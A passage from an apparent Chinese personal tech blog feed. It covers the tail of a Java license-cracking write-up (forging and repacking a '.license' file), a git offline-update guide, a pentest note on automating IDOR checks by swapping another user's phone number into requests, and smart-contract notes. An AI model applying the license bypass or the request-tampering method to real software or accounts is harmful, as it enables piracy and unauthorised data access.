zipOutput.putArchiveEntry(entry);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            final byte[] buffer = new byte[1024];</span></span><br><span class="line"><span class="comment">//            int len = 0;</span></span><br><span class="line"><span class="comment">//            while ((len = in.read(buffer)) != -1) &#123;</span></span><br><span class="line"><span class="comment">//                zipOutput.write(buffer, 0, len);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(paramArrayOfByte), zipOutput);  <span class="comment">//IOUtils.copy(in,out)方法拷贝流</span></span><br><span class="line"></span><br><span class="line">            zipOutput.closeArchiveEntry();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//可继续添加 文件</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="comment">//            if (in != null) &#123;</span></span><br><span class="line"><span class="comment">//                try &#123;</span></span><br><span class="line"><span class="comment">//                    in.close();</span></span><br><span class="line"><span class="comment">//                &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//                    e.printStackTrace();</span></span><br><span class="line"><span class="comment">//                &#125;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="keyword">if</span> (zipOutput != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    zipOutput.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="上传破解"><a href="#上传破解" class="headerlink" title="上传破解:"></a>上传破解:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808163742.png" alt="20200808163742"></p>
<p>其余2个文件不用动,将新生成的<code>licenseInfo</code>和它俩一起打包成zip后,再修改后缀为<code>.license</code></p>
<p>上传,可发现破解成功。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808164004.png" alt="20200808164004"></p>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>验证license的函数主要有两个部分:</p>
<ol>
<li>非对称&#x2F;对称的加解密</li>
<li>md5验证</li>
</ol>
<p>涉及到的知识点:</p>
<ul>
<li>java的流</li>
</ul>
<blockquote>
<p>1.excited!破解的过程还是挺有趣的.<br>2.后面要好好学学java</p>
</blockquote>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://blog.csdn.net/top_code/article/details/40505523">Apache Commons Compress例子</a></li>
<li><a href="https://blog.csdn.net/u013087513/article/details/52151227">Java IO操作——掌握压缩流的使用</a></li>
<li><a href="https://www.iteye.com/blog/songjianyong-1571029">java对称加密（AES）</a></li>
<li><a href="https://www.cnblogs.com/xdp-gacl/p/3634409.html">java基础学习总结——流</a></li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-简单的代码离线更新方案</title>
    <url>//35326.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>部署在内网的主机,无法联网,需要在离线的状态下进行更新.</p>
<hr>
<h1 id="方案"><a href="#方案" class="headerlink" title="方案:"></a>方案:</h1><p>使用git 的<code>git format-patch</code>或者 <code>git bundle</code></p>
<p>两者的区别:</p>
<p><a href="https://stackoverflow.com/questions/24013127/which-is-better-to-use-and-why-git-format-patch-or-git-bundle">Which is better to use and why? git format-patch or git bundle?</a></p>
<blockquote>
<p><code>git bundle</code> only makes sense if you transfer a changeset from one git-repository to another, whereas <code>git format-patch</code> creates standard diff-files which can be inspected easily and applied to a non-gitified source tree as well. on the other hand <code>git bundle</code> creates a single file, which is easier to transport than the multi-file output of <code>git format-patch</code></p>
</blockquote>
<p><code>git bundle</code>只产生一个文件,只能应用于同一个仓库,而<code>git format-patch</code>会产生多个文件,不仅限于同一个仓库.</p>
<hr>
<h1 id="git-bundle"><a href="#git-bundle" class="headerlink" title="git bundle:"></a>git bundle:</h1><p>使用场景:</p>
<ul>
<li>有可能你的网络中断了，但你又希望将你的提交传给你的合作者们。 </li>
<li>可能你不在办公网中并且出于安全考虑没有给你接入内网的权限。 </li>
<li>可能你的无线、有线网卡坏掉了。 </li>
<li>可能你现在没有共享服务器的权限，你又希望通过邮件将更新发送给别人，却不希望通过 <code>format-patch</code> 的方式传输 40 个提交。</li>
</ul>
<p><code>bundle</code> 命令会将 <code>git push</code> 命令所传输的所有内容打包成一个二进制文件，你可以将这个文件通过邮件或者闪存传给其他人，然后解包到其他的仓库中。</p>
<hr>
<h2 id="git-bundle-使用命令"><a href="#git-bundle-使用命令" class="headerlink" title="git bundle 使用命令:"></a>git bundle 使用命令:</h2><h2 id="创建"><a href="#创建" class="headerlink" title="创建:"></a>创建:</h2><p>生成<code>repo.bundle</code>的文件，该文件包含了所有重建该仓库<code>master</code>分支所需的数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git bundle create repo.bundle HEAD master</span><br></pre></td></tr></table></figure>

<p>在使用 <code>bundle</code> 命令时，你需要列出所有你希望<strong>打包的引用或者提交的区间</strong>。 如果你希望这个仓库可以在别处被克隆，你应该像例子中那样增加一个 HEAD 引用。</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用:"></a>应用:</h2><p>克隆项目</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> repo.bundle repo</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="git-format-patch"><a href="#git-format-patch" class="headerlink" title="git format-patch:"></a>git format-patch:</h1><blockquote>
<p>UNIX世界的软件开发大多都是协作式的，因此，Patch（补丁）是一个相当重要的东西，因为几乎所有的大型UNIX项目的普通贡献者，都是通过 Patch来提交代码的。作为最重要的开源项目之一，Linux，也是这样的。普通开发者从软件仓库clone下代码，然后写入代码，做一个Patch， 最后用E-mail发给Linux Kernel的维护者就好了。Git最初作为Linux的版本控制工具，提供了透明、完整、稳定的Patch功能。</p>
</blockquote>
<blockquote>
<p>我们先介绍一下Patch是什么。如果一个软件有了新版本，我们可以完整地下载新版本的代码进行编译安装。然而，像Linux Kernel这样的大型项目，代码即使压缩，也超过70MB，每次全新下载是有相当大的代价的。然而，每次更新变动的代码可能不超过1MB，因此，我们只 要能够有两个版本代码的diff的数据，应该就可以以极低的代价更新程序了。因此，Larry Wall开发了一个工具：patch。它可以根据一个diff文件进行版本更新。</p>
</blockquote>
<blockquote>
<p>不过在git中，我们没有必要直接使用diff和patch来做补丁，这样做既危险又麻烦。git提供了两种简单的patch方案。一是用git diff生成的标准patch，二是git format-patch生成的Git专用Patch。</p>
</blockquote>
<h2 id="git-format-patch-使用命令"><a href="#git-format-patch-使用命令" class="headerlink" title="git format-patch 使用命令:"></a>git format-patch 使用命令:</h2><h2 id="创建patch"><a href="#创建patch" class="headerlink" title="创建patch:"></a>创建patch:</h2><p>某次提交（含）之前的几次提交：n指从sha1 id对应的commit开始算起n个提交</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git format-patch 【commit sha1 <span class="built_in">id</span>】-n</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git format-patch  2a2fb4539925bfa4a141fe492d9828d030f7c8a8 -2</span><br></pre></td></tr></table></figure>

<p>某两次提交之间的所有patch:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git format-patch 【commit sha1 <span class="built_in">id</span>】..【commit sha1 <span class="built_in">id</span>】 </span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git format-patch  2a2fb4539925bfa4a141fe492d9828d030f7c8a8..89aebfcc73bdac8054be1a242598610d8ed5f3c8</span><br></pre></td></tr></table></figure>

<h2 id="应用patch"><a href="#应用patch" class="headerlink" title="应用patch:"></a>应用patch:</h2><p>检查patch&#x2F;diff是否能正常打入:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git apply --check 【path/to/xxx.patch】</span><br><span class="line">git apply --check 【path/to/xxx.diff】</span><br></pre></td></tr></table></figure>

<p>打入patch&#x2F;diff:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git apply 【path/to/xxx.patch】</span><br><span class="line">git apply 【path/to/xxx.diff】</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary:"></a>Summary:</h1><p><code>git bundle</code>可以理解为全量更新<br><code>git format-patch</code>可以理解为增量更新</p>
<p>为了方便,还是选择了<code>git bundle</code>,因为使用<code>git format-patch</code>的过程,容易出现<code>patch</code>打不上导致更新中断的问题.</p>
<p>不过对于更严谨的更新方案的话,还是应该选择<code>git format-patch</code>的.</p>
<hr>
<h1 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路:"></a>大体思路:</h1><ul>
<li>更新包生成端:<ul>
<li>分别生成各个项目的<code>bundle</code>文件</li>
<li>加密压缩成<code>zip</code>文件</li>
</ul>
</li>
<li>更新包使用端:<ul>
<li>用密钥解密压缩包</li>
<li>到指定目录移除原来的项目,执行<code>git clone</code></li>
</ul>
</li>
</ul>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g13nngtg6pj31320u0wpg.jpg"></p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="http://www.mottoin.com/article/network/97143.html">巡风在隔离网络环境下的离线更新方案</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/33208607">携程无线离线包增量更新方案实践</a></li>
<li><a href="https://gitee.com/liujin0506/autopatch">根据git对比分支与tag之间的文件变动，生成补丁包</a></li>
<li><a href="https://blog.csdn.net/jinweilin/article/details/78356860">git打两个版本的增量包</a></li>
<li><a href="https://www.jianshu.com/p/ec04de3f95cc">Git 打补丁– patch 和 diff 的使用（详细）</a></li>
<li><a href="https://git-scm.com/book/zh/v2/Git-%E5%B7%A5%E5%85%B7-%E6%89%93%E5%8C%85">Git 工具 - 打包</a></li>
<li><a href="https://github.com/an23lm/GitBundlePlus">Bundle a local Git project with all uncommitted changes and stashes (git bundle on steroids).</a></li>
<li><a href="https://blog.csdn.net/sinat_20059415/article/details/80598347">git 打补丁方法总结</a></li>
<li><a href="https://blog.csdn.net/kangear/article/details/39675421">Git打补丁常见问题</a></li>
<li><a href="https://www.cnblogs.com/y041039/articles/2411600.html">Git的Patch功能</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>越权半自动化插件的尝试</title>
    <url>//14249.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>当一个事情变得枯燥时，就该考虑自动化了。</p>
<p>场景：当你渗透测试一个网站时，你发现其中某个页面某个参数存在越权时，你就会想那么其他页面的其他包的这个参数会不会有问题。。。</p>
<p>可是又要全测一边会觉得累，不测又会觉得漏。<br>那这个时候就可以考虑下自动化，半自动化了。</p>
<p>我就尝试在<a href="https://github.com/w-digital-scanner/w13scan/tree/master/W13SCAN">w13scan</a>的架构下,编写了一个简单的越权半自动化插件</p>
<hr>
<h1 id="流程"><a href="#流程" class="headerlink" title="流程:"></a>流程:</h1><h2 id="第一步-手工测试找vuln-parameter"><a href="#第一步-手工测试找vuln-parameter" class="headerlink" title="第一步:手工测试找vuln_parameter"></a>第一步:手工测试找vuln_parameter</h2><p>先是手工测试出某个包的某个参数是存在越权漏洞的,也就是这个参数值可能服务器没有做很完备的鉴权。</p>
<p>比如是<code>phone</code>这个参数,那么以这个作为<code>vuln_key</code>(<code>vuln_parameter</code>)</p>
<h2 id="第二步-以vuln-parameter做路由"><a href="#第二步-以vuln-parameter做路由" class="headerlink" title="第二步:以vuln_parameter做路由"></a>第二步:以vuln_parameter做路由</h2><p>就是含有<code>vuln_parameter</code>的包,都会路由到这个插件里进行处理</p>
<h2 id="第三步-确定payload"><a href="#第三步-确定payload" class="headerlink" title="第三步:确定payload"></a>第三步:确定payload</h2><p>比如是<code>phone参数</code>,然后准备另一个用户的手机号码</p>
<p>确定payload: <code>&#123;&quot;phone&quot;:134xxxxxx&#125;</code></p>
<h2 id="第四步-篡改request包"><a href="#第四步-篡改request包" class="headerlink" title="第四步:篡改request包"></a>第四步:篡改request包</h2><p>以<code>vuln_parameter</code>去定位包中要篡改的位置,然后将准备好的payload的参数值替换上去.</p>
<h2 id="第五步-发包-权衡判断条件"><a href="#第五步-发包-权衡判断条件" class="headerlink" title="第五步:发包,权衡判断条件"></a>第五步:发包,权衡判断条件</h2><p>判断我感觉比较麻烦:</p>
<p>可以通过<code>status_code</code>状态码,Response状态码为200的话可以先保证:<strong>篡改的过程中的请求参数没有出错。</strong></p>
<p>然后再加上一个<code>And</code>的条件：正向特征、反向特征</p>
<ul>
<li>正向特征:</li>
</ul>
<p>先收集一些请求成功且有返回一定数据的Response包</p>
<p>例如Response的body里:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;msg&#x27;:&#x27;OK&#x27;, data:&#123;&quot;name&quot;:xxx, &quot;address&quot;:xxx&#125;&#125;</span><br></pre></td></tr></table></figure>


<ul>
<li>反向特征:</li>
</ul>
<p>收集一些请求成功但是服务端有鉴权判定为越权的Response包</p>
<p>例如Response的body里:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;你没有权限进行此操作&#x27;</span>, data:null&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;不可以越权操作&#x27;</span>, data:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;xxxxx&#x27;</span>, data:false&#125;</span><br></pre></td></tr></table></figure>

<p>从正反两个方面去提取一些特征,作为判断是否有越权漏洞的标志。</p>
<p>比如</p>
<p>正向的就是 :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> status_code =<span class="number">200</span> <span class="keyword">and</span> response[<span class="string">&#x27;msg&#x27;</span>] == <span class="string">&#x27;OK&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;vuln&quot;</span>)</span><br></pre></td></tr></table></figure>


<p>反向的就是 :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> status_code =<span class="number">200</span> <span class="keyword">and</span> response[<span class="string">&#x27;data&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> null</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;vuln&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>判断的效果 跟判断条件有很大的关系<br>判断严了,容易漏 判断松了 容易误报<br>那么我觉得比较好的判断原则是: 宁可误报,也不要漏</p>
</blockquote>
<h2 id="大致流程图"><a href="#大致流程图" class="headerlink" title="大致流程图:"></a>大致流程图:</h2><p><img src="https://i.loli.net/2019/12/30/uQoROD6WfMypPLl.jpg"></p>
<hr>
<h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图:"></a>效果图:</h1><p><img src="https://i.loli.net/2019/12/29/16tzTDCNMK47uLl.jpg"></p>
<p>效果不是很理想,一开始以为可以找到更多处地方的越权漏洞,结果只能验证到原来手工能测出来的那个越权点。</p>
<p>但是好处就是,你确定这个<code>vuln_parameter</code>在其他页面确实是没问题的。</p>
<p>这个思路是大致ok的,之后再优化下,在别的系统上应该能有比较好的效果。</p>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><ul>
<li>半自动化流程:</li>
</ul>
<ol>
<li>手工测试找<code>vuln_parameter</code></li>
<li>以<code>vuln_parameter</code>做路由</li>
<li>确定payload</li>
<li>篡改request包</li>
<li>发包,权衡判断条件</li>
</ol>
<ul>
<li><p>这种情况下是只持有单用户的token,如果有两个用户的token和更多的数据包,判断效果会更好</p>
</li>
<li><p>只适用于平行越权,普通用户a越权查看普通用户b的信息,只能做查的操作,增删改的操作貌似做不到。</p>
</li>
<li><p>每换一个<code>vuln_parameter</code>就要修改一下脚本,可考虑修改的地方作为变量,但是因为<code>w13scan</code>架构的关系,暂时好像不支持插件中含有变量</p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>SmartContract-CryptoZombie僵尸世界NFT游戏</title>
    <url>//60348.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>在做完<a href="https://cryptozombies.io/zh/course">僵尸教程</a>后，觉得很不错，所以想从头写一遍，写一个dapp练练手。<br>前端用vue<br>合约用solidity，部署到ropsten测试网</p>
<h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图:"></a>效果图:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211129150336.png" alt="20211129150336"></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211129150410.png" alt="20211129150410"></p>
<h1 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程:"></a>测试流程:</h1><ol>
<li>在remix编写solidity</li>
<li>在remix直接部署合约到<code>JavaScript VM</code>，把要用到函数走一遍流程</li>
<li>truffle部署到ropsten测试网</li>
<li>vue编写代码调试，与合约交互</li>
</ol>
<h1 id="部署"><a href="#部署" class="headerlink" title="部署:"></a>部署:</h1><p>执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">truffle migrate --network ropsten</span><br></pre></td></tr></table></figure>

<p>即可部署至Ropsten</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211129152415.png" alt="20211129152415"></p>
<p>部署完毕后，把json文件copy到前端里面，在代码实例化后就可以直接使用了。</p>
<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug:"></a>Bug:</h1><p>把遇到的bug列一下</p>
<h2 id="truffle初始化错误"><a href="#truffle初始化错误" class="headerlink" title="truffle初始化错误:"></a>truffle初始化错误:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">truffle init</span><br></pre></td></tr></table></figure>

<p>直接用上面的命令去初始化truffle项目时，可能遇到网络问题等原因，无法直接初始化，<br>可以去github下载<br><code>git clone https://github.com/truffle-box/bare-box</code></p>
<h2 id="truffle部署合约"><a href="#truffle部署合约" class="headerlink" title="truffle部署合约:"></a>truffle部署合约:</h2><p>部署到测试网时，<code>truffle migrate --network ropsten</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 报错</span><br><span class="line">Error: Cannot find module &#x27;@truffle/hdwallet-provider&#x27;</span><br></pre></td></tr></table></figure>

<p>解决办法： <code>npm install @truffle/hdwallet-provider</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 报错</span><br><span class="line">Error encountered, bailing. Network state unknown. Review successful transactions manually.</span><br><span class="line">insufficient funds for gas * price + value</span><br></pre></td></tr></table></figure>

<p>解决办法：要确保助记词和钱包对应得上,且钱包里有足够的Ether</p>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法:"></a>语法:</h1><p>把遇到的一些语法问题列一下</p>
<h2 id="pure-vs-view"><a href="#pure-vs-view" class="headerlink" title="pure vs view:"></a>pure vs view:</h2><p>pure比view更加严格</p>
<p><code>view</code>读取存储，但不会修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract viewExample &#123;</span><br><span class="line"></span><br><span class="line">    string state;</span><br><span class="line"></span><br><span class="line">    // other contract functions</span><br><span class="line"></span><br><span class="line">    function viewState() public view returns(string) &#123;</span><br><span class="line">        //read the contract storage </span><br><span class="line">        return state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>pure</code>可以被认为是返回值仅由它的参数（输入值）确定的子集。不会对存储进行读写操作，只会使用局部变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract pureExample &#123;</span><br><span class="line"></span><br><span class="line">    // other contract functions</span><br><span class="line"></span><br><span class="line">    function pureComputation(uint para1 , uint para2) public pure returns(uint result) &#123;</span><br><span class="line">        // do whatever with para1 and para2 and assign to result as below</span><br><span class="line">        result = para1 + para2;</span><br><span class="line">        return  result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://ethereum.stackexchange.com/questions/28898/when-to-use-view-and-pure-in-place-of-constant">When to use “View” and “Pure” in place of “Constant”</a></p>
<h2 id="external-vs-public"><a href="#external-vs-public" class="headerlink" title="external vs public:"></a>external vs public:</h2><p>public - all can access</p>
<p>external - Cannot be accessed internally, only externally</p>
<p>internal - only this contract and contracts deriving from it can access</p>
<p>private - can be accessed only from this contract</p>
<p><a href="https://ethereum.stackexchange.com/questions/19380/external-vs-public-best-practices"><code>external</code> vs <code>public</code> best practices</a></p>
<h2 id="array删除"><a href="#array删除" class="headerlink" title="array删除:"></a>array删除:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">uint[] assets;</span><br><span class="line"><span class="title function_">mapping</span>(<span class="function"><span class="params">uint</span>=&gt;</span>uint) indexOfAsset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">removeAssetFromArray</span>(<span class="params">uint _assetToDelete</span>) &#123;</span><br><span class="line">  uint index = indexOfAsset[_assetToDelete];</span><br><span class="line">  <span class="keyword">if</span> (!index) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (assets.<span class="property">length</span> &gt; <span class="number">1</span>) &#123; <span class="comment">// 把最后一项移到你需要删除的位置，进行覆盖</span></span><br><span class="line">    assets[index] = assets[assets.<span class="property">length</span>-<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  assets.<span class="property">length</span>--; <span class="comment">// Implicitly recovers gas from last element storage</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://ethereum.stackexchange.com/questions/35790/efficient-approach-to-delete-element-from-array-in-solidity/41025">Efficient approach to delete element from array in Solidity</a></p>
<h2 id="invalid-opcode-“0xfe”"><a href="#invalid-opcode-“0xfe”" class="headerlink" title="invalid opcode “0xfe”:"></a>invalid opcode “0xfe”:</h2><p>合约数组可能有越界访问的问题，这个时候多去remix把操作流程仔细走一遍，看看调用哪个函数会出错。</p>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://learnblockchain.cn/2019/12/20/vue-dapp">【教程】如何使用Vue.js 开发以太坊DApp</a></li>
<li><a href="https://naruto-1996.github.io/2021/03/19/eth-zhi-neng-he-yue-kai-fa/">ETH智能合约开发(vue + 智能合约)</a></li>
<li><a href="https://npm.io/package/zombie-char-component">zombie-char-component v1.0.7</a></li>
<li><a href="https://github.com/onee-io/crypto-zombies">https://github.com/onee-io/crypto-zombies</a></li>
<li><a href="https://github.com/Fankouzu/smart-contract/blob/master/Solidity%20Lesson%2004/contracts/zombieCore.sol">https://github.com/Fankouzu/smart-contract/blob/master/Solidity%20Lesson%2004/contracts/zombieCore.sol</a></li>
<li><a href="https://fankouzu.github.io/my-crypto-zombie/?MyZombie">https://fankouzu.github.io/my-crypto-zombie/?MyZombie</a></li>
<li><a href="https://code.z01.com/bootstrap-vue/docs/components/card.html">https://code.z01.com/bootstrap-vue/docs/components/card.html</a></li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Solidity</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>SmartContract-Uniswap原理-恒定乘积公式</title>
    <url>//54061.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>查了一些有关uniswap源码解析的文章，找到这篇<a href="https://medium.com/taipei-ethereum-meetup/uniswap-explanation-constant-product-market-maker-model-in-vyper-dff80b8467a1">Uniswap 解析：恆定乘積做市商模型 Constant Product Market Maker Model 的 Vyper 實作</a><br>里面讲得非常清楚，涉及到一些数学公式的推导，自己推导一遍，之后再去看uniswap的代码会清晰很多。</p>
<h1 id="恒定乘积公式"><a href="#恒定乘积公式" class="headerlink" title="恒定乘积公式"></a>恒定乘积公式</h1><h2 id="无手续费"><a href="#无手续费" class="headerlink" title="无手续费:"></a>无手续费:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x * y = k</span><br></pre></td></tr></table></figure>

<ul>
<li>令交易的两虚拟货币为 X 和 Y，各自数量为 x 和 y</li>
<li>两货币数量的乘积 x * y 恆等于 k</li>
<li>k 值是由第一笔注入的流动性所决定</li>
</ul>
<p>因此，用<code>∆x</code>数量的<code>X</code>币来购买<code>Y</code>币所能得到的数量<code>∆y</code>、或是为了购买<code>∆y</code>需要付出的<code>∆x</code>数量</p>
<p>依照此公式进行计算：<code>(x+∆x)(y-∆y) = k</code>，而交易的价格就是两币量 <code>∆x</code> 和 <code>∆y</code> 的比。</p>
<p>以下公式用 <code>α = ∆x / x</code> 和 <code>β = ∆y / y</code> 来表示 <code>∆x</code> 和 <code>∆y</code> 及 <code>X</code> <code>Y</code> 两币在交易发生后的新均衡数量：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219133127.png" alt="20220219133127"></p>
<p>公式推导:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219131154.png" alt="20220219131154"></p>
<p>这样可以推导出前2行</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219132237.png" alt="20220219132237"></p>
<p>接着推导<code>∆x</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219132331.png" alt="20220219132331"></p>
<p>推导<code>∆y</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219132509.png" alt="20220219132509"></p>
<p>第一个图里的公式，都推导完了。</p>
<h2 id="计入手续费"><a href="#计入手续费" class="headerlink" title="计入手续费:"></a>计入手续费:</h2><p>在 Uniswap 进行的每一笔交易都会被收取 <code>ρ = 0.003 / 0.3%</code> 的手续费回馈给流动性提供者liquidity provider，因此要将手续费纳入公式的考量：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219132744.png" alt="20220219132744"></p>
<p>文里作者推荐从 <code>∆x</code> 和 <code>∆y</code> 两值开始去推导</p>
<p>手续费 ρ &#x3D; 0.3% 的意思是会从付款中扣掉 0.3 %，也就是从<code>∆x</code>扣。</p>
<p>在有手续费的情况下 <code>∆x</code> 就变成了 <code>(1-ρ)∆x</code> ，若令 <code>γ = 1-ρ</code> 则为 <code>γ∆x</code>。因此，将图一中的 <code>∆x</code> 换成 <code>γ∆x</code>，就会得到以下式子：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219133241.png" alt="20220219133241"></p>
<p>将等号左方的 <code>γ</code> 移到右方后就得到了图二中的 <code>∆x</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219133820.png" alt="20220219133820"></p>
<p>接着推导<code>∆y</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219133922.png" alt="20220219133922"></p>
<p>而 <code>x’</code> 还有 <code>y’</code> 就可以由 <code>∆x</code> 和 <code>∆y</code> 推出来</p>
<p>推导<code>x’</code> ：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219134244.png" alt="20220219134244"></p>
<p>推导<code>y’</code> ：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219135742.png" alt="20220219135742"></p>
<p>将图二中得到的 x’ 和 y’ 相乘，会得到：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219135907.png" alt="20220219135907"></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219140837.png" alt="20220219140837"></p>
<p>当有手续费使得<code>γ != 1</code>或<code>ρ != 0</code>，<code>x’ρ * y’ρ</code> 的值其实会稍微和 <code>xy = k</code> 不同</p>
<p>实际上 <code>γ = 0.997</code> 或 <code>ρ = 0.003</code>，因此 1除以0.997-1 &#x3D;&gt; <code>1/γ-1 ≒ 0.003</code>。</p>
<p><code>β = ∆y / y</code> 代表的是换得的 Y 币佔总量的比例，即使最大值为1(全部兑换出来)，误差也只有 1 * 0.003，故可知手续费 &#x3D; 0.3% 对于 k 值的影响极小。</p>
<h2 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码:"></a>相关代码:</h2><p>给定<code>∆x</code>能购买多少<code>∆y</code></p>
